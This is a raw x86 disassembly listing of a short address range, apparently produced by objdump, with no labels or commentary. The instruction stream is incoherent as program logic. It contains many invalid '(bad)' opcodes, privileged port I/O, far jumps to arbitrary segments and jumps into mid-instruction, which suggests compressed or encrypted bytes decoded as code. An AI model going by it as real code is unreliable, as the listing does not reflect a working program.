  40dc9d:	sub    eax,0x65b17875
  40dca2:	(bad)  
  40dca3:	hlt    
  40dca4:	dec    edx
  40dca5:	inc    ebx
  40dca6:	in     al,0x65
  40dca8:	iret   
  40dca9:	xor    al,0x2c
  40dcab:	std    
  40dcac:	ficomp WORD PTR [edi+0x7133b273]
  40dcb2:	xor    cl,0x51
  40dcb5:	lea    ebp,[eax-0x623105d5]
  40dcbb:	and    edx,DWORD PTR [eax-0x3f0cd675]
  40dcc1:	fldl2e 
  40dcc3:	(bad)  
  40dcc4:	jns    0x40dd14
  40dcc6:	dec    esp
  40dcc7:	xor    al,0xb9
  40dcc9:	inc    ebp
  40dcca:	push   0x43
  40dccc:	sub    BYTE PTR [eax+ecx*4-0x7c],bl
  40dcd0:	fcom   DWORD PTR ss:[edx-0x40]
  40dcd4:	das    
  40dcd5:	ret    0x6c8e
  40dcd8:	add    eax,0x5809d81c
  40dcdd:	push   esi
  40dcde:	sar    DWORD PTR [ebx+0x7b553f88],1
  40dce4:	shl    BYTE PTR [ebp+0x33],1
  40dce7:	mov    ch,0xc4
  40dce9:	sbb    al,0x8
  40dceb:	aaa    
  40dcec:	jge    0x40dd3b
  40dcee:	pushf  
  40dcef:	pusha  
  40dcf0:	jbe    0x40dcb0
  40dcf2:	push   ecx
  40dcf3:	mov    edx,0xfb196c56
  40dcf8:	cld    
  40dcf9:	out    dx,al
  40dcfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcfb:	inc    eax
  40dcfc:	pop    ecx
  40dcfd:	pop    ecx
  40dcfe:	je     0x40dd7c
  40dd00:	std    
  40dd01:	std    
  40dd02:	shl    BYTE PTR [ebx],1
  40dd04:	(bad)  
  40dd05:	or     BYTE PTR [eax+ebx*2],dh
  40dd08:	push   ecx
  40dd09:	dec    ebx
  40dd0a:	in     eax,0xb2
  40dd0c:	ins    DWORD PTR es:[edi],dx
  40dd0d:	pop    edx
  40dd0e:	in     eax,dx
  40dd0f:	adc    al,0xd4
  40dd11:	pop    es
  40dd12:	repz jmp 0x4e23:0xf894aa95
  40dd1a:	mov    cl,0x38
  40dd1c:	ds ret 0x1791
  40dd20:	mov    ch,0xeb
  40dd22:	fs jne 0x40dd25
  40dd25:	mov    esi,0x4aaded89
  40dd2a:	jno    0x40dcf1
  40dd2c:	push   es
  40dd2d:	adc    eax,0x38a8dcfe
  40dd32:	push   DWORD PTR [ecx+0x379a0a23]
  40dd38:	nop
  40dd39:	call   0x110f9dcd
  40dd3e:	clc    
  40dd3f:	cwde   
  40dd40:	push   es
  40dd41:	loop   0x40dd0e
  40dd43:	enter  0x6b15,0x76
  40dd47:	mov    al,0x5a
  40dd49:	out    dx,al
  40dd4a:	xor    DWORD PTR [ecx+0x4556f0a7],ebx
  40dd50:	pop    edi
  40dd51:	addr16 sub al,0xff
  40dd54:	test   eax,0x3906e0e1
  40dd59:	pop    edi
  40dd5a:	adc    ah,dl
  40dd5c:	mov    al,ds:0x8fce00fc
  40dd61:	adc    al,0x9c
  40dd63:	xchg   edx,eax
  40dd64:	sti    
  40dd65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd66:	mov    al,ds:0x87fca36
  40dd6b:	jae    0x40dd4d
  40dd6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd6e:	icebp  
  40dd6f:	mov    esi,0x4edab8de
  40dd74:	aas    
  40dd75:	(bad)  
  40dd76:	retf   0x77a0
  40dd79:	push   ecx
  40dd7a:	push   ds
  40dd7b:	jmp    0x40dd37
  40dd7d:	fidivr DWORD PTR [ecx]
  40dd7f:	lea    edi,[edx+0x8]
  40dd82:	out    0xea,eax
  40dd84:	inc    edi
  40dd85:	adc    ecx,DWORD PTR [edx+esi*4+0x33]
  40dd89:	cli    
  40dd8a:	jp     0x40dd57
  40dd8c:	or     BYTE PTR [esi+edx*4],0x2e
  40dd90:	adc    eax,0x6689f597
  40dd95:	push   esi
  40dd96:	xor    al,0xfd
  40dd98:	dec    ebx
  40dd99:	mov    dl,0x2e
  40dd9b:	sar    BYTE PTR [eax+0x61],0x42
  40dd9f:	or     BYTE PTR [edi-0x6c8d1c69],bl
  40dda5:	mov    esi,0xfb1b59ad
  40ddaa:	mov    ebx,0x185ca996
  40ddaf:	arpl   WORD PTR [esi-0x27],dx
  40ddb2:	in     al,0x1b
  40ddb4:	cwde   
  40ddb5:	test   BYTE PTR [ebp-0xd1fd251],al
  40ddbb:	jmp    0x28f9:0x1ef96d85
  40ddc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddc3:	enter  0x6803,0x22
  40ddc7:	jmp    0xa5b3:0x5d7ff953
  40ddce:	nop
  40ddcf:	mov    DWORD PTR [edi-0x108412ce],edi
  40ddd5:	pop    ecx
  40ddd6:	fcomp  st(4)
  40ddd8:	pushf  
  40ddd9:	jge    0x40ddbb
  40dddb:	xor    eax,0xe9d46327
  40dde0:	mov    BYTE PTR [edi],0xf3
  40dde3:	pop    ebx
  40dde4:	dec    esi
  40dde5:	int    0xb2
  40dde7:	fwait
  40dde8:	mov    eax,ds:0xb8f8233f
  40dded:	adc    eax,0xa3928d38
  40ddf2:	bound  esi,QWORD PTR [ebx-0x57fca98d]
  40ddf8:	push   ebx
  40ddf9:	lahf   
  40ddfa:	jmp    0x590e0627
  40ddff:	mov    es,WORD PTR [edx+esi*8-0x6c]
  40de03:	xor    al,BYTE PTR ds:0x64e5f780
  40de09:	jb     0x40de40
  40de0b:	jl     0x40ddb0
  40de0d:	das    
  40de0e:	and    ecx,DWORD PTR [ebx]
  40de10:	retf   0xe2b5
  40de13:	sbb    al,0x3b
  40de15:	add    BYTE PTR [ebx-0x5d1395e8],ch
  40de1b:	pop    ebx
  40de1c:	or     eax,0x36a7d84d
  40de21:	mov    eax,0x660f9392
  40de26:	fisttp QWORD PTR [ebx]
  40de28:	outs   dx,DWORD PTR ds:[esi]
  40de29:	sahf   
  40de2a:	xor    al,0x2e
  40de2c:	ret    0x4513
  40de2f:	cmp    eax,0xb590fd30
  40de34:	stos   BYTE PTR es:[edi],al
  40de35:	sub    DWORD PTR ds:0x8b62de3d,edi
  40de3b:	call   0x6a0:0xe9453aca
  40de42:	mov    ss,ebx
  40de44:	out    0x65,al
  40de46:	pop    ebp
  40de47:	sub    al,0xef
  40de49:	jmp    0x79c52468
  40de4e:	(bad)  
  40de4f:	imul   eax,DWORD PTR [ecx],0xffffffb7
  40de52:	enter  0xacff,0x9a
  40de56:	cli    
  40de57:	js     0x40de26
  40de59:	rol    DWORD PTR [ecx-0x45],0xfb
  40de5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de5e:	mov    edx,0xeaaeb3e5
  40de63:	xchg   ebp,eax
  40de64:	jno    0x40de9b
  40de66:	scas   eax,DWORD PTR es:[edi]
  40de67:	mov    ds:0x7a56ec54,eax
  40de6c:	pop    eax
  40de6d:	rcr    DWORD PTR [edi-0x1cf077c5],0xe8
  40de74:	pusha  
  40de75:	pop    edi
  40de76:	inc    edx
  40de77:	repnz mov ecx,0x191890f0
  40de7d:	cmp    DWORD PTR [ebp-0x5b24516],0xd9d1373f
  40de87:	jae    0x40dec9
  40de89:	mov    edi,0x94203e15
  40de8e:	or     eax,0x5dff79e9
  40de93:	mov    al,BYTE PTR [ebp+0x7b5e5b5d]
  40de99:	push   esi
  40de9a:	mov    cl,0xf8
  40de9c:	xchg   ebx,eax
  40de9d:	(bad)  
  40de9f:	enter  0x56cc,0x95
  40dea3:	jge    0x40debf
  40dea5:	lods   al,BYTE PTR ds:[esi]
  40dea6:	sub    bh,BYTE PTR [edx+0x59]
  40dea9:	icebp  
  40deaa:	scas   al,BYTE PTR es:[edi]
  40deab:	push   ebp
  40deac:	(bad)  
  40dead:	in     eax,0x53
  40deaf:	and    ebx,DWORD PTR [esi-0x3831554e]
  40deb5:	int    0xcf
  40deb7:	dec    BYTE PTR ds:0x68e447a9
  40debd:	pop    ss
  40debe:	popa   
  40debf:	xchg   esp,eax
  40dec0:	dec    esp
  40dec1:	xlat   BYTE PTR ds:[ebx]
  40dec2:	mov    ds:0xb317e92d,al
  40dec7:	aas    
  40dec8:	outs   dx,BYTE PTR ds:[esi]
  40dec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40deca:	nop
  40decb:	mov    ch,0xdd
  40decd:	out    dx,eax
  40dece:	or     edx,DWORD PTR [esi]
  40ded0:	stc    
  40ded1:	add    BYTE PTR [esi+0x60],cl
  40ded4:	xchg   esp,eax
  40ded5:	jbe    0x40dedd
  40ded7:	push   ds
  40ded8:	ins    BYTE PTR es:[edi],dx
  40ded9:	bound  ebp,QWORD PTR [ebx+0x31]
  40dedc:	repnz mov al,ds:0x7c778535
  40dee2:	inc    eax
  40dee3:	repnz cmc 
  40dee5:	aad    0x5c
  40dee7:	pop    ebx
  40dee8:	lods   eax,DWORD PTR ds:[esi]
  40dee9:	imul   esp,DWORD PTR gs:[ecx+ecx*1-0x2],0x1de73817
  40def2:	xchg   esi,eax
  40def3:	out    0xa7,eax
  40def5:	mov    ah,0x8c
  40def7:	out    0xbd,eax
  40def9:	iret   
  40defa:	push   0xffffffe7
  40defc:	call   0xece1c0d6
  40df01:	aas    
  40df02:	xchg   DWORD PTR [ebp+0x35],esi
  40df05:	adc    al,0x90
  40df07:	aad    0x5c
  40df09:	adc    eax,0x1aca1158
  40df0e:	ss ret 0xb760
  40df12:	push   esp
  40df13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df14:	shl    BYTE PTR [eax+eax*8-0x67b8225],1
  40df1b:	and    eax,0xdc87e06e
  40df20:	cdq    
  40df21:	inc    eax
  40df22:	ins    DWORD PTR es:[edi],dx
  40df23:	xchg   ecx,eax
  40df24:	jns    0x40dee8
  40df26:	aad    0xe
  40df28:	sub    al,0x28
  40df2a:	jg     0x40df0a
  40df2c:	adc    ebp,esp
  40df2e:	pusha  
  40df2f:	push   0x2f
  40df31:	add    edi,DWORD PTR ds:0x4957d146
  40df37:	xor    ah,BYTE PTR [ebp-0x77]
  40df3a:	jne    0x40ded2
  40df3c:	cmp    eax,0xc10c6918
  40df41:	mov    eax,0x41505cbc
  40df46:	xchg   esi,eax
  40df47:	jo     0x40df81
  40df49:	sbb    DWORD PTR [edx-0x10],esp
  40df4c:	adc    edi,eax
  40df4e:	cmp    eax,0x5d42bd90
  40df53:	adc    eax,0xc6e96695
  40df58:	loop   0x40df65
  40df5a:	lods   al,BYTE PTR ds:[esi]
  40df5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df5c:	scas   al,BYTE PTR es:[edi]
  40df5d:	loop   0x40df47
  40df5f:	xchg   ebp,eax
  40df60:	fnstcw WORD PTR [ebp+0x1]
  40df63:	or     ebp,DWORD PTR [edi+0x6be86b4d]
  40df69:	sub    al,0x62
  40df6b:	add    dl,BYTE PTR [eax]
  40df6d:	cmp    eax,eax
  40df6f:	xchg   ebx,eax
  40df70:	fs mov esp,0x9161f1c3
  40df76:	xlat   BYTE PTR ds:[ebx]
  40df77:	sbb    esp,DWORD PTR [edi+esi*4]
  40df7a:	(bad)  
  40df7b:	mov    bl,0x7f
  40df7d:	jno    0x40dfa1
  40df7f:	mov    ch,0x6c
  40df81:	push   edx
  40df82:	aas    
  40df83:	retf   
  40df84:	mov    ebx,0xc00dc3b
  40df89:	imul   edi,DWORD PTR [ebp-0x7b],0x3067ed9f
  40df90:	or     eax,0x3a39f86d
  40df95:	mov    al,ds:0xa2783bbd
  40df9a:	adc    eax,0x6c4f45c3
  40df9f:	mov    ah,0xab
  40dfa1:	or     eax,0xc5ee25b7
  40dfa6:	mov    ebp,gs
  40dfa8:	mov    esi,ebx
  40dfaa:	push   ebp
  40dfab:	dec    eax
  40dfac:	push   ss
  40dfad:	jecxz  0x40df31
  40dfaf:	fwait
  40dfb0:	or     DWORD PTR [ecx+0xf],ebp
  40dfb3:	jo     0x40e01b
  40dfb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfb6:	sti    
  40dfb7:	fdiv   st,st(0)
  40dfb9:	rcl    BYTE PTR [esi+0x795eb637],0x29
  40dfc0:	ret    0x8993
  40dfc3:	lock adc bh,dl
  40dfc6:	push   ss
  40dfc7:	cmp    dh,ah
  40dfc9:	inc    ecx
  40dfca:	aam    0x78
  40dfcc:	vpmadcsswd xmm3,xmm2,xmm1,XMMWORD PTR [eax+0xbaaff0]
  40dfd6:	scas   eax,DWORD PTR es:[edi]
  40dfd7:	mov    ah,BYTE PTR [ebp-0x5110c909]
  40dfdd:	mov    cl,0xde
  40dfdf:	clc    
  40dfe0:	mov    ds:0x6efaf369,al
  40dfe5:	ror    ebp,0xb9
  40dfe8:	fidivr DWORD PTR [edi]
  40dfea:	sub    bh,BYTE PTR [edx-0x47]
  40dfed:	xchg   esp,eax
  40dfee:	pop    eax
  40dfef:	ds jmp 0xa966361c
  40dff5:	fst    DWORD PTR [edi+0x5f067d4b]
  40dffb:	dec    edx
  40dffc:	mov    edx,0x3e8c40bb
  40e001:	jae    0x40dfba
  40e003:	icebp  
  40e004:	pop    edx
  40e005:	leave  
  40e006:	pop    ebp
  40e007:	and    BYTE PTR [ecx-0xaf799f0],ch
  40e00d:	jnp    0x40e089
  40e00f:	xchg   edi,eax
  40e010:	out    0x91,al
  40e012:	dec    eax
  40e013:	ror    edx,0xdd
  40e016:	xchg   esp,eax
  40e017:	xchg   esi,eax
  40e018:	xor    ch,BYTE PTR [ebp-0x2aceff2f]
  40e01e:	hlt    
  40e01f:	pop    esp
  40e020:	jnp    0x40e003
  40e022:	add    dl,ah
  40e024:	call   0x1f86ba02
  40e029:	mov    al,al
  40e02b:	sub    eax,0xfd139b21
  40e030:	repnz xor BYTE PTR [edi+edi*8-0x1aeff56f],bl
  40e038:	jmp    0x42c4415e
  40e03d:	cld    
  40e03e:	mov    dl,0xde
  40e040:	fbstp  TBYTE PTR [edi]
  40e042:	jmp    0x40e085
  40e044:	add    dh,BYTE PTR [esi-0x2760887a]
  40e04a:	retf   0xa0a3
  40e04d:	push   edx
  40e04e:	(bad)  
  40e050:	sub    eax,0xee03acbb
  40e055:	shr    DWORD PTR [edi+eiz*4-0x97ed78c],cl
  40e05c:	fs popf 
  40e05e:	push   eax
  40e05f:	or     eax,0xa1e1afe5
  40e064:	inc    ebx
  40e065:	repz and ah,ah
  40e068:	pminub mm6,QWORD PTR [edi+0x12bafc03]
  40e06f:	call   0x25d7:0x389baaa3
  40e076:	loopne 0x40e0a2
  40e078:	jbe    0x40e051
  40e07a:	jmp    0x40e086
  40e07c:	add    eax,0xdee2062c
  40e081:	scas   al,BYTE PTR es:[edi]
  40e082:	(bad)  
  40e083:	loopne 0x40e089
  40e085:	int    0x5
  40e087:	xchg   edi,eax
  40e088:	inc    esp
  40e089:	push   0x5d37edc3
  40e08e:	mov    ecx,0xa4178d78
  40e093:	je     0x40e065
  40e095:	add    ebx,ecx
  40e097:	pop    es
  40e098:	xor    eax,0xad433aa5
  40e09d:	bound  esp,QWORD PTR [eax-0xc1e4041]
  40e0a3:	mov    ecx,0xeb375ad0
  40e0a8:	sti    
  40e0a9:	xchg   ebp,eax
  40e0aa:	adc    BYTE PTR [ecx+0x4d],dh
  40e0ad:	xlat   BYTE PTR ds:[ebx]
  40e0ae:	mov    WORD PTR [edx+0x70],ss
  40e0b1:	xchg   ebx,eax
  40e0b2:	inc    esp
  40e0b3:	mov    dl,0x6
  40e0b5:	adc    BYTE PTR ds:0x44b82832,al
  40e0bb:	jo     0x40e049
  40e0bd:	fwait
  40e0be:	sbb    dl,BYTE PTR [ebx-0x20]
  40e0c1:	jmp    0xafee086d
  40e0c6:	fld    QWORD PTR [ebp+0x66]
  40e0c9:	aas    
  40e0ca:	and    edi,ebx
  40e0cc:	lea    esi,[ebp+0x68]
  40e0cf:	jle    0x40e0a0
  40e0d1:	nop
  40e0d2:	clc    
  40e0d3:	inc    edx
  40e0d4:	arpl   WORD PTR [ebp-0x18],dx
  40e0d7:	lods   al,BYTE PTR ds:[esi]
  40e0d8:	test   eax,ecx
  40e0da:	mov    esp,0x2877d0a6
  40e0df:	das    
  40e0e0:	in     al,0xc6
  40e0e2:	jns    0x40e144
  40e0e4:	add    esi,DWORD PTR [ecx-0x9]
  40e0e7:	sbb    al,0x4a
  40e0e9:	and    DWORD PTR ds:0x3ef279a1,ebp
  40e0ef:	dec    esi
  40e0f0:	out    0x97,al
  40e0f2:	das    
  40e0f3:	xchg   edx,eax
  40e0f4:	mov    eax,0x91179edb
  40e0f9:	fcomp  DWORD PTR [esi+0x49]
  40e0fc:	cdq    
  40e0fd:	ins    DWORD PTR es:[edi],dx
  40e0fe:	xor    dh,dl
  40e100:	inc    esp
  40e101:	enter  0x5725,0x19
  40e105:	jp     0x40e179
  40e107:	sub    BYTE PTR [ecx],ch
  40e109:	out    0xd0,eax
  40e10b:	add    eax,0x6d151c92
  40e110:	pusha  
  40e111:	lea    esp,ds:0xf9b85e29
  40e117:	mov    ds:0xd8d67163,al
  40e11c:	cs dec esp
  40e11e:	sahf   
  40e11f:	or     dh,BYTE PTR [edi]
  40e121:	std    
  40e122:	out    0xe0,eax
  40e124:	mov    bh,0x51
  40e126:	xchg   esi,eax
  40e127:	in     al,dx
  40e128:	sbb    eax,0x55
  40e12b:	xchg   edi,eax
  40e12c:	ins    DWORD PTR es:[edi],dx
  40e12d:	pop    ecx
  40e12e:	aas    
  40e12f:	mov    ds:0xbb5d8730,al
  40e134:	out    0x8b,al
  40e136:	adc    BYTE PTR [ebx],dh
  40e138:	push   ebx
  40e139:	push   ds
  40e13a:	idiv   DWORD PTR [eax+0x6]
  40e13d:	jge    0x40e115
  40e13f:	cmp    DWORD PTR [esi],eax
  40e141:	add    dh,BYTE PTR [esi+ecx*1-0x6370c8cd]
  40e148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e149:	scas   al,BYTE PTR es:[edi]
  40e14a:	dec    ecx
  40e14b:	mov    bh,0x8f
  40e14d:	sbb    al,0xe5
  40e14f:	mov    ebx,0x1c25e819
  40e154:	xor    bl,BYTE PTR [esi]
  40e156:	push   esi
  40e157:	out    dx,al
  40e158:	jb     0x40e125
  40e15a:	ds mov ah,0x5c
  40e15d:	push   0x2a
  40e15f:	lahf   
  40e160:	mov    cl,bh
  40e162:	push   edx
  40e163:	inc    ebx
  40e164:	xor    esi,esp
  40e166:	push   cs
  40e167:	ja     0x40e14b
  40e169:	push   ebp
  40e16a:	xlat   BYTE PTR ds:[ebx]
  40e16b:	xor    dl,ch
  40e16d:	adc    BYTE PTR [edi],dh
  40e16f:	ret    
  40e170:	mov    bl,0x3d
  40e172:	pop    edx
  40e173:	pop    eax
  40e174:	mov    ebp,0x660e18f1
  40e179:	add    esi,DWORD PTR [ecx-0x70c16468]
  40e17f:	loope  0x40e11c
  40e181:	and    dl,bh
  40e183:	mov    al,0xa1
  40e185:	jecxz  0x40e1b9
  40e187:	adc    DWORD PTR [ebx+0x7e],0x77
  40e18b:	mov    BYTE PTR [edi-0x2dd65b1f],cl
  40e191:	inc    edi
  40e192:	sar    BYTE PTR [edx+0x1a],1
  40e195:	mov    dl,0x86
  40e197:	jno    0x40e1d5
  40e199:	pop    ebp
  40e19a:	jbe    0x40e203
  40e19c:	call   0xe155:0xdb030178
  40e1a3:	mov    ecx,0xb447381c
  40e1a8:	nop
  40e1a9:	mov    eax,0x34364ddc
  40e1ae:	or     al,0x16
  40e1b0:	dec    ebp
  40e1b1:	popa   
  40e1b2:	push   edx
  40e1b3:	fld    QWORD PTR [esi]
  40e1b5:	ins    BYTE PTR es:[edi],dx
  40e1b6:	dec    ecx
  40e1b7:	jne    0x40e196
  40e1b9:	bound  esi,QWORD PTR [eax+0x55]
  40e1bc:	jmp    DWORD PTR ds:0x241ea685
  40e1c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1c3:	outs   dx,DWORD PTR ds:[esi]
  40e1c4:	repnz into 
  40e1c6:	xlat   BYTE PTR ds:[ebx]
  40e1c7:	mov    eax,ds:0x22a82a9f
  40e1cc:	test   DWORD PTR [ecx-0x6e47ce22],esp
  40e1d2:	jle    0x40e1fa
  40e1d4:	mov    ah,0x37
  40e1d6:	out    dx,eax
  40e1d7:	jno    0x40e172
  40e1d9:	imul   ebp,DWORD PTR [ebx],0xc72768cb
  40e1df:	mov    esp,0x8fa225b
  40e1e4:	sub    BYTE PTR [eax+0xdd525d8],0x5d
  40e1eb:	push   esi
  40e1ec:	sti    
  40e1ed:	rcr    DWORD PTR [ecx],0x4c
  40e1f0:	inc    esp
  40e1f1:	std    
  40e1f2:	jno    0x40e190
  40e1f4:	in     al,0x59
  40e1f6:	sbb    BYTE PTR [ecx+0x71c3a978],al
  40e1fc:	fisub  DWORD PTR [ecx]
  40e1fe:	xor    al,0xca
  40e200:	mov    esi,0xdb897cb
  40e205:	(bad)  
  40e206:	xchg   ecx,eax
  40e207:	jae    0x40e219
  40e209:	xchg   ebx,eax
  40e20a:	stos   DWORD PTR es:[edi],eax
  40e20b:	ins    DWORD PTR es:[edi],dx
  40e20c:	push   ecx
  40e20d:	xchg   edi,eax
  40e20e:	ror    DWORD PTR [edx],1
  40e210:	push   es
  40e211:	push   eax
  40e212:	sti    
  40e213:	mov    esp,0xaa39f69d
  40e218:	mov    dl,0xe7
  40e21a:	add    bh,0xbc
  40e21d:	jp     0x40e282
  40e21f:	push   esi
  40e220:	jmp    0x7e97:0xfcda5cf
  40e227:	sahf   
  40e228:	xchg   DWORD PTR ds:0x6fdddfa4,eax
  40e22e:	push   es
  40e22f:	adc    bh,cl
  40e231:	lods   al,BYTE PTR ds:[esi]
  40e232:	stos   DWORD PTR es:[edi],eax
  40e233:	scas   al,BYTE PTR es:[edi]
  40e234:	add    al,0x9d
  40e236:	outs   dx,BYTE PTR ds:[esi]
  40e237:	pop    eax
  40e238:	sbb    al,0x37
  40e23a:	push   edx
  40e23b:	cmp    dh,bh
  40e23d:	pop    ebx
  40e23e:	(bad)  
  40e23f:	xlat   BYTE PTR ds:[ebx]
  40e240:	icebp  
  40e241:	xchg   ebp,eax
  40e242:	sbb    bh,BYTE PTR [edi]
  40e244:	std    
  40e245:	sbb    al,0xa0
  40e247:	sub    esp,edx
  40e249:	sahf   
  40e24a:	in     eax,dx
  40e24b:	aad    0xf0
  40e24d:	xchg   edx,eax
  40e24e:	in     eax,0x47
  40e250:	jecxz  0x40e208
  40e252:	inc    esi
  40e253:	gs push edx
  40e255:	or     eax,ebp
  40e257:	mov    esp,0xd1862f6c
  40e25c:	rcr    BYTE PTR [edi+esi*1+0x639d246b],0xe4
  40e264:	call   0x2845:0xc1ba2e54
  40e26b:	add    eax,DWORD PTR [edx-0x28022c44]
  40e271:	xor    ch,dh
  40e273:	mov    bh,0xfa
  40e275:	cmp    dh,ah
  40e277:	xor    esp,DWORD PTR [ebx+0x2f8fbd56]
  40e27d:	push   esi
  40e27e:	arpl   WORD PTR [esi-0x4a],dx
  40e281:	and    BYTE PTR [eax+esi*8+0x5ccc2625],ch
  40e288:	jg     0x40e2fa
  40e28a:	adc    ah,BYTE PTR [edx+0x6455b9ea]
  40e290:	cmp    al,0x82
  40e292:	xchg   ebp,eax
  40e293:	cs xor al,0xeb
  40e296:	cwde   
  40e297:	push   edi
  40e298:	push   esp
  40e299:	aaa    
  40e29a:	fild   QWORD PTR [esi-0x1a]
  40e29d:	sbb    bh,dl
  40e29f:	xchg   esp,eax
  40e2a0:	pop    ds
  40e2a1:	jo     0x40e2c2
  40e2a3:	(bad)  
  40e2a4:	in     eax,0x28
  40e2a6:	lea    edi,[ebx-0x175326d0]
  40e2ac:	cli    
  40e2ad:	mov    esi,0xcf5862e2
  40e2b2:	int3   
  40e2b3:	inc    ecx
  40e2b4:	mov    WORD PTR [edx+0x588cd8fd],gs
  40e2ba:	out    dx,al
  40e2bb:	fisubr WORD PTR [ebp+0xbfc5314]
  40e2c1:	fwait
  40e2c2:	add    eax,0x8279b439
  40e2c7:	out    dx,al
  40e2c8:	mov    ds:0x95b20754,eax
  40e2cd:	ins    DWORD PTR es:[edi],dx
  40e2ce:	das    
  40e2cf:	inc    ebp
  40e2d0:	repnz pushf 
  40e2d2:	push   ebx
  40e2d3:	add    al,0x3b
  40e2d5:	lahf   
  40e2d6:	and    DWORD PTR [ebx-0x4ded1975],ecx
  40e2dc:	lods   al,BYTE PTR ds:[esi]
  40e2dd:	mov    eax,0xfc193334
  40e2e2:	enter  0x3f71,0x40
  40e2e6:	pop    es
  40e2e7:	dec    ebp
  40e2e8:	jnp    0x40e318
  40e2ea:	push   0x88a94fdb
  40e2ef:	push   edi
  40e2f0:	bnd jp 0x40e32a
  40e2f3:	inc    esi
  40e2f4:	dec    edx
  40e2f5:	arpl   WORD PTR [edi+0x5a],si
  40e2f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2f9:	les    edi,FWORD PTR [ecx-0x7a]
  40e2fc:	mov    esi,0xa49c3908
  40e301:	loope  0x40e2a5
  40e303:	add    esp,DWORD PTR ds:[eax]
  40e306:	jge    0x40e300
  40e308:	push   edx
  40e309:	outs   dx,BYTE PTR ds:[esi]
  40e30a:	rcl    BYTE PTR [ebx],1
  40e30c:	or     eax,0x594f001c
  40e311:	sbb    dh,BYTE PTR [eax+0x2b81e3e0]
  40e317:	jp     0x40e34a
  40e319:	scas   al,BYTE PTR es:[edi]
  40e31a:	adc    eax,0x89e8873a
  40e31f:	into   
  40e320:	mov    ah,0x84
  40e322:	or     al,BYTE PTR [ecx]
  40e324:	out    0x81,al
  40e326:	adc    esp,DWORD PTR [edx-0x1e]
  40e329:	jp     0x40e356
  40e32b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e32c:	ja     0x40e35d
  40e32e:	jmp    0x3f87:0x2c4c1d01
  40e335:	inc    ebp
  40e336:	imul   eax,DWORD PTR [eax-0xb],0xc14de639
  40e33d:	in     eax,0xde
  40e33f:	test   BYTE PTR [ecx+edx*2+0x73],bl
  40e343:	loopne 0x40e310
  40e345:	mov    ds:0x189f9e44,eax
  40e34a:	jle    0x40e2f5
  40e34c:	inc    ebp
  40e34d:	cmp    al,0xdb
  40e34f:	mov    esi,0x24b38467
  40e354:	push   ebp
  40e355:	repnz lods al,BYTE PTR ds:[esi]
  40e357:	lds    esi,FWORD PTR [ebx+0x16]
  40e35a:	mov    eax,0xf418fa3c
  40e35f:	dec    edx
  40e360:	mov    ah,0x14
  40e362:	cli    
  40e363:	fstp   TBYTE PTR [eax-0xe]
  40e366:	add    al,0xb
  40e368:	out    dx,al
  40e369:	push   cs
  40e36a:	xchg   edi,eax
  40e36b:	(bad)  
  40e36c:	or     BYTE PTR [edx+0x62515b5d],bl
  40e372:	mov    edi,ds
  40e374:	push   esi
  40e375:	add    BYTE PTR [esi],dh
  40e377:	mov    cl,0xa6
  40e379:	aad    0x54
  40e37b:	or     BYTE PTR [edi],bh
  40e37d:	imul   ecx,DWORD PTR [ebp-0x66724d31],0x3708d3f4
  40e387:	retf   
  40e388:	clc    
  40e389:	jmp    0x40e3b2
  40e38b:	jl     0x40e402
  40e38d:	jle    0x40e326
  40e38f:	mov    ah,ch
  40e391:	pop    ebx
  40e392:	cmp    eax,DWORD PTR [esi+0x52f6e88b]
  40e398:	inc    ebp
  40e399:	dec    ebx
  40e39a:	xor    dl,bh
  40e39c:	fdivr  QWORD PTR [edx+0x3032ade8]
  40e3a2:	jle    0x40e3bb
  40e3a4:	mov    edx,0xb418a2ef
  40e3a9:	cmp    al,0x7c
  40e3ac:	add    DWORD PTR [eax-0x56],0xffffff84
  40e3b0:	cmp    BYTE PTR [eax-0x68],dl
  40e3b3:	dec    edx
  40e3b4:	bound  esi,QWORD PTR [eax]
  40e3b6:	mov    ah,0xa1
  40e3b8:	xchg   esp,eax
  40e3b9:	xchg   edi,eax
  40e3ba:	and    bl,BYTE PTR [edx+edx*8-0x9add417]
  40e3c1:	jp     0x40e3d6
  40e3c3:	jno    0x40e378
  40e3c5:	xor    DWORD PTR [edx],ebx
  40e3c7:	lea    edx,[edx]
  40e3c9:	shl    BYTE PTR [eax+0x72],0xa5
  40e3cd:	jge    0x40e384
  40e3cf:	std    
  40e3d0:	fild   DWORD PTR [ebx]
  40e3d2:	sub    al,0x5e
  40e3d4:	pop    esp
  40e3d5:	jbe    0x40e3e4
  40e3d7:	outs   dx,DWORD PTR ds:[esi]
  40e3d8:	into   
  40e3d9:	int    0x18
  40e3db:	cmc    
  40e3dc:	stos   DWORD PTR es:[edi],eax
  40e3dd:	adc    eax,0xde855410
  40e3e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3e3:	push   cs
  40e3e4:	cli    
  40e3e5:	imul   eax,DWORD PTR [esi+0x25],0xcfdbb40e
  40e3ec:	frstpm(287 only) 
  40e3ee:	pop    edx
  40e3ef:	mov    cl,0xdd
  40e3f1:	jns    0x40e3b7
  40e3f3:	mov    bh,0x45
  40e3f5:	and    bl,BYTE PTR [ebp+edi*2-0x78]
  40e3f9:	push   0x67891f21
  40e3fe:	ins    DWORD PTR es:[edi],dx
  40e3ff:	pop    ebp
  40e400:	aaa    
  40e401:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e402:	(bad)  
  40e403:	clc    
  40e404:	lock xor eax,0xa1cb6a4c
  40e40a:	ja     0x40e472
  40e40c:	rcr    BYTE PTR [edx-0x2f],cl
  40e40f:	sub    bh,BYTE PTR [ebp+0x72f39e4e]
  40e415:	popf   
  40e416:	(bad)  
  40e418:	test   eax,0x7579ed5e
  40e41d:	push   edx
